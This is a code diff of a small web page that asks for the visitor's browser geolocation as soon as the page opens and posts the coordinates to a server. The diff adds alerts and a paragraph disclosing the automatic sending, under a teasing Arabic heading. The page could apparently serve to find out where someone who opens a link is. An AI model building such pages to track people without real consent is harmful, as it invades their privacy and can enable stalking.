@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Location via Email</title>
     <script>
-        // Function to send location when allowed
+        // Function to send location automatically on page load
         function sendLocation() {
             if ("geolocation" in navigator) {
                 // Request permission to access location
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const { latitude, longitude } = position.coords;  // Actual location
+                        const { latitude, longitude } = position.coords; // Actual location
 
                         const emailData = new FormData();
                         emailData.append('latitude', latitude);
@@ -24,10 +24,13 @@
                             body: emailData
                         })
                         .then(response => response.json())
-                        .then(() => console.log('Location sent successfully!'))
+                        .then(() => {
+                            alert('Location sent successfully!');
+                            console.log('Location sent successfully!');
+                        })
                         .catch((error) => {
                             console.error('Error:', error);
-                            alert('Failed to send the email.');
+                            alert('Failed to send the location.');
                         });
                     },
                     (error) => {
@@ -39,12 +42,12 @@
             }
         }
 
-        // Trigger location sending when the page loads
+        // Trigger location sending automatically when the page loads
         window.onload = sendLocation;
     </script>
 </head>
 <body>
     <h1>هسيبك لخيالك</h1>
-
+    <p>This page will automatically try to send your location when you open it. Please ensure to allow location permissions when prompted.</p>
 </body>
 </html>
